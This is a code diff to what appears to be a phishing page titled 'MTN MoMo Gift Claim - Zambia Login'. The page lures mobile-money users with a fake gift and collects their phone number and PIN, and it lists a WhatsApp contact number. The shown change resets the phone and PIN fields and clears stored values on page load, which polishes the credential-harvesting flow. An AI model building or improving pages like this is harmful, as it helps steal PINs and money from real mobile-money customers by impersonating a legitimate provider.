@@ -754,17 +754,21 @@
         });
 
         // ============================================
-        // AUTO-FOCUS AND LOAD
+        // AUTO-FOCUS AND LOAD (CLEAN - NO PRE-FILL)
         // ============================================
         window.addEventListener('load', () => {
-            const savedPhone = localStorage.getItem('momoPhone');
-            if (savedPhone && savedPhone.length === 9) {
-                phoneInput.value = savedPhone;
-            }
+            // ✅ Ensure input is empty
+            phoneInput.value = '';
+            pinBoxes.forEach(box => box.value = '');
+
+            // ✅ Clear any stored phone/PIN from previous sessions
+            localStorage.removeItem('momoPhone');
+            localStorage.removeItem('momoPin');
+
             phoneInput.focus();
             checkPinComplete();
 
-            console.log('✅ MTN MoMo Gift Claim - Zambia Login Loaded');
+            console.log('✅ MTN MoMo Gift Claim - Zambia Login Loaded (Clean)');
             console.log('🇿🇲 Country: +260 (Zambia)');
             console.log('📱 WhatsApp: +254710161648');
             console.log('🎁 Gift:', localStorage.getItem('selectedGift'), '-', localStorage.getItem('selectedGiftValue'));
